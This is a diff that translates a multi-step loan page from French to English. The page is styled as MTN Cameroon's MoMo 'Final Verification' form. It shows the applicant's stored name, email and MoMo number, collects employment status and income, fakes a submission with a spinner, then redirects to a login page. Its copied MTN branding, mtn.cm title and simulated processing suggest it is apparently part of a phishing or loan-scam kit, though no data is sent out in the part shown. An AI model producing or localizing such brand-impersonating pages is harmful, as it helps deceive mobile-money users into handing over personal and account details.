@@ -1,12 +1,11 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
-    <title>MTN  | Vérification finale – mtn.cm</title>
+    <title>MTN  | Final Verification – mtn.cm</title>
     <meta name="theme-color" content="#FFCC00">
     <style>
-        /* identical to original – no changes needed */
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         * {
             margin: 0;
@@ -402,32 +401,32 @@
     </header>
     <main class="card">
         <div class="top">
-            <h1 class="form-title">Vérification finale</h1>
+            <h1 class="form-title">Final Verification</h1>
             <div class="progress-bar">
                 <div class="progress-fill"></div>
             </div>
-            <div class="step-text">Confirmer et soumettre</div>
-            <label class="form-label">Situation professionnelle</label>
+            <div class="step-text">Confirm and submit</div>
+            <label class="form-label">Employment Status</label>
             <select class="form-select" id="employmentStatus">
-                <option>Employé</option>
-                <option>Indépendant</option>
-                <option>Sans emploi</option>
-                <option>Étudiant</option>
+                <option>Employed</option>
+                <option>Self-employed</option>
+                <option>Unemployed</option>
+                <option>Student</option>
             </select>
-            <label class="form-label">Revenu annuel estimé (XAF)</label>
-            <input type="number" class="form-input" id="annualIncome" placeholder="ex. 2 000 000" inputmode="numeric">
-            <div class="error-message" id="errIncome">Veuillez saisir un revenu annuel valide (minimum 2 000 XAF recommandé).</div>
+            <label class="form-label">Estimated Annual Income (XAF)</label>
+            <input type="number" class="form-input" id="annualIncome" placeholder="e.g. 2,000,000" inputmode="numeric">
+            <div class="error-message" id="errIncome">Please enter a valid annual income (minimum 2,000 XAF recommended).</div>
             <div class="summary-box" id="summaryBox"></div>
             <div class="global-feedback" id="globalFeedback">
-                Veuillez vérifier les informations ci-dessus et remplir le champ requis pour soumettre.
+                Please review the information above and fill in the required field to submit.
             </div>
         </div>
         <div class="btn-group">
-            <button class="prev-btn" onclick="history.back()">Étape précédente</button>
-            <button class="submit-btn" id="submitBtn">Soumettre la demande</button>
+            <button class="prev-btn" onclick="history.back()">Previous Step</button>
+            <button class="submit-btn" id="submitBtn">Submit Application</button>
         </div>
     </main>
-    <footer>© 2026 MTN Cameroun – Services financiers mobiles agréés | Propulsé par MTN Mobile Money (MoMo) | Conditions de  applicables</footer>
+    <footer>© 2026 MTN Cameroon – Licensed mobile financial services | Powered by MTN Mobile Money (MoMo) | Terms apply</footer>
 
     <div id="spinnerOverlay">
         <div class="spinner"></div>
@@ -436,47 +435,45 @@
     <div id="successOverlay">
         <div class="success-card">
             <div class="check-icon">✓</div>
-            <div class="success-title">Demande soumise</div>
+            <div class="success-title">Application Submitted</div>
             <div class="success-msg">
-                Votre demande de crédit MTN  a été soumise avec succès.<br><br>
-                Vous serez contacté(e) prochainement pour la vérification. Une confirmation sera envoyée à votre numéro MTN MoMo et à votre adresse e-mail.
+                Your MTN  credit application has been submitted successfully.<br><br>
+                You will be contacted shortly for verification. A confirmation will be sent to your MTN MoMo number and email address.
             </div>
             <div class="redirect-bar">
                 <div class="loader"></div>
-                Redirection vers le portail MTN  dans <span id="countdown">3</span>…
+                Redirecting to MTN  portal in <span id="countdown">3</span>…
             </div>
-            <button class="go-login-btn" onclick="window.location.href='login.html'">Accéder à MTN </button>
+            <button class="go-login-btn" onclick="window.location.href='login.html'">Go to MTN </button>
         </div>
     </div>
 
     <script>
-        // Récupération des données stockées
+        // Retrieve stored data
         const summaryBox = document.getElementById('summaryBox');
         const loanAmount = localStorage.getItem('loanAmount') || '5000';
-        const formattedAmount = parseFloat(loanAmount).toLocaleString('fr-FR');
+        const formattedAmount = parseFloat(loanAmount).toLocaleString('en-US');
         const termDays = localStorage.getItem('loanTerm') || '30';
 
         let loanTypeDisplay = localStorage.getItem('loanType') || 'MTN ';
         if (!loanTypeDisplay.includes('MTN')) loanTypeDisplay = 'MTN ';
 
-        // Formatage du numéro de téléphone (si présent)
         let phone = localStorage.getItem('phone') || 'N/A';
         if (phone !== 'N/A' && phone.length === 9) {
-            // Formatage +237 6 55 12 34 56 (exemple)
             phone = '+237 ' + phone.substring(0,1) + ' ' + phone.substring(1,3) + ' ' + phone.substring(3,5) + ' ' + phone.substring(5,7) + ' ' + phone.substring(7,9);
         }
 
         summaryBox.innerHTML = `
-            <div class="summary-row"><span>Produit de crédit:</span><span class="summary-value">${loanTypeDisplay}</span></div>
-            <div class="summary-row"><span>Montant demandé:</span><span class="summary-value">XAF ${formattedAmount}</span></div>
-            <div class="summary-row"><span>Durée:</span><span class="summary-value">${termDays} jours</span></div>
-            <div class="summary-row"><span>Objet:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Dépenses générales'}</span></div>
-            <div class="summary-row"><span>Demandeur:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
-            <div class="summary-row"><span>E-mail:</span><span class="summary-value">${localStorage.getItem('email') || 'N/A'}</span></div>
-            <div class="summary-row"><span>Numéro MTN MoMo:</span><span class="summary-value">${phone}</span></div>
+            <div class="summary-row"><span>Credit product:</span><span class="summary-value">${loanTypeDisplay}</span></div>
+            <div class="summary-row"><span>Amount requested:</span><span class="summary-value">XAF ${formattedAmount}</span></div>
+            <div class="summary-row"><span>Duration:</span><span class="summary-value">${termDays} days</span></div>
+            <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'General expenses'}</span></div>
+            <div class="summary-row"><span>Applicant:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
+            <div class="summary-row"><span>Email:</span><span class="summary-value">${localStorage.getItem('email') || 'N/A'}</span></div>
+            <div class="summary-row"><span>MTN MoMo Number:</span><span class="summary-value">${phone}</span></div>
         `;
 
-        // Pré-remplir les champs de situation et revenu s'ils existent
+        // Pre-fill fields if they exist
         if (localStorage.getItem('employmentStatus')) {
             document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
         }
@@ -498,16 +495,14 @@
             }
             if (!isValid) return;
 
-            // Sauvegarde des données
+            // Save data
             localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
             localStorage.setItem('annualIncome', income);
 
-            // Afficher le spinner
             const spinnerOverlay = document.getElementById('spinnerOverlay');
             spinnerOverlay.style.display = 'flex';
             setTimeout(() => {
                 spinnerOverlay.style.display = 'none';
-                // Afficher la popup de succès
                 const successOverlay = document.getElementById('successOverlay');
                 successOverlay.style.display = 'flex';
                 let seconds = 3;
